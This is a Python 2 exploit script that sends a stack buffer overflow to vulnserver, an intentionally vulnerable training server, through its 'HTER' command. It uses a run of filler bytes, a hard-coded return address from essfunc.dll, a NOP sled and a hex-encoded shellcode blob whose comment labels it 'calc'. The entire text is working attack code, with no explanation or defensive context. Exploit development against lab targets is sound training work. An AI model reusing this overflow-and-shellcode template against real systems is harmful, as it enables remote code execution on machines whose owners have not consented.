import socket

server = '192.168.228.4'  # The server's hostname or IP address
port = 9999               # The port used by the server

#calc
buf = 'dbc3d97424f45a31c9be60c7c3b0b13031721803721883ea9c25364cb428b9ad444d3348754d2718257d234cc9f661655a7aae8aeb3188a5ec6ae8a46e713d074fba304688a7b91a41a36c8be6f9ac20b4ecb4d50c0e944b0749366dc4e17f7509cf360ef9bbc8c630436627fdb6766f39290d993ad4165e41029245e1c104a21005d2211ee2906e02f575053e7e78cab7c45fce9c9ffe577871fe88232e5ac2c93bd78987ba65b4e5bd75b759d6443c36a15897735d13bad5f6fa2e649bfc84aaa27e2d52519e44571d18b4250ecdba9a2fc4d87dbc841e'

#only hex chars are available. each hex byte sent is converted to actual hex character 
junk = 'HTER ' + 'A'*2041 
#625011AF essfunc.dll (vulnserver)
eip = 'AF115062'

shellcode = '90' * 24 + buf

payload = junk + eip + shellcode 

exploit = payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(exploit)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()

